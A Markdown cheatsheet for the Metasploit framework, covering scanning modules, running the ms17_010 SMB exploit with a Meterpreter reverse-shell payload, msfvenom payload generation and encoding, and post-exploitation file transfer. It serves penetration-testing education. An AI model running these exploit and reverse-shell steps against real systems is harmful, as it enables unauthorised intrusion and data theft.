title: Metasploit Cheatsheet

category: Pentesting
description: A quick reference guide for essential Metasploit commands, exploit modules, and best practices for penetration testing.

---

## 🛠️ Commands

### **Basic Metasploit Operations**

| Command                        | Description                                       |
| ------------------------------ | ------------------------------------------------- |
| `msfconsole`                 | Launch Metasploit framework                       |
| `search <exploit>`           | Search for available exploits                     |
| `use exploit/<exploit_name>` | Select an exploit module                          |
| `set RHOST <target>`         | Set the target IP address                         |
| `set PAYLOAD <payload_name>` | Choose a payload for exploitation                 |
| `show options`               | Display available options for the selected module |
| `exploit`                    | Execute the exploit                               |

### **Scanning & Enumeration**

| Command                                     | Description                  |
| ------------------------------------------- | ---------------------------- |
| `use auxiliary/scanner/portscan/tcp`      | Perform a TCP port scan      |
| `use auxiliary/scanner/http/http_version` | Identify web server versions |
| `use auxiliary/gather/dns_enum`           | Perform DNS enumeration      |
| `use auxiliary/scanner/smb/smb_version`   | Enumerate SMB versions       |

### **Payloads & Post-Exploitation**

| Command                                         | Description                            |
| ----------------------------------------------- | -------------------------------------- |
| `use payload/windows/meterpreter/reverse_tcp` | Use Meterpreter reverse shell          |
| `sessions -i <session_id>`                    | Interact with an active session        |
| `meterpreter > sysinfo`                       | Display system information             |
| `meterpreter > getuid`                        | Show current user privileges           |
| `meterpreter > upload <file>`                 | Upload a file to the target system     |
| `meterpreter > download <file>`               | Download a file from the target system |

### **Generating Payloads with msfvenom**

| Command                                                       | Description                     |
| ------------------------------------------------------------- | ------------------------------- |
| `msfvenom -p <payload> -f <format> LHOST=<IP> LPORT=<port>` | Generate a payload              |
| `msfvenom -l payloads`                                      | List available payloads         |
| `msfvenom -l encoders`                                      | List available encoders         |
| `msfvenom -e <encoder> -i <iterations>`                     | Encode a payload multiple times |

---

## 🔄 Workflows

### **Performing a Basic Exploit**

1. Launch Metasploit using `msfconsole`.
2. Search for an exploit using `search <exploit>`.
3. Select an exploit using `use exploit/<exploit_name>`.
4. Set the target IP using `set RHOST <target>`.
5. Choose a payload using `set PAYLOAD <payload_name>`.
6. Execute the exploit using `exploit`.

### **Post-Exploitation with Meterpreter**

1. Gain access using a Meterpreter payload.
2. Interact with the session using `sessions -i <session_id>`.
3. Enumerate system details using `sysinfo` and `getuid`.
4. Upload or download files using `upload <file>` and `download <file>`.

### **Generating Custom Payloads**

1. Use `msfvenom -p <payload> -f <format> LHOST=<IP> LPORT=<port>` to create a payload.
2. Encode the payload using `msfvenom -e <encoder> -i <iterations>`.
3. Deploy the payload on the target system.

---

## 💡 Examples

```sh
# Launch Metasploit
msfconsole

# Search for an exploit
search windows/smb/ms17_010

# Use an exploit module
use exploit/windows/smb/ms17_010

# Set target IP
set RHOST 192.168.1.100

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Execute exploit
exploit
```

---

## 📚 References

- **[Metasploit Cheat Sheet - GitHub](https://github.com/security-cheatsheet/metasploit-cheat-sheet)**
- **[Metasploit Cheat Sheet - Comparitech](https://www.comparitech.com/net-admin/metasploit-cheat-sheet/)**
- **[Metasploit Cheat Sheet: Master the Modules - StationX](https://www.stationx.net/metasploit-cheat-sheet/)**

```
<!-- end list -->
```
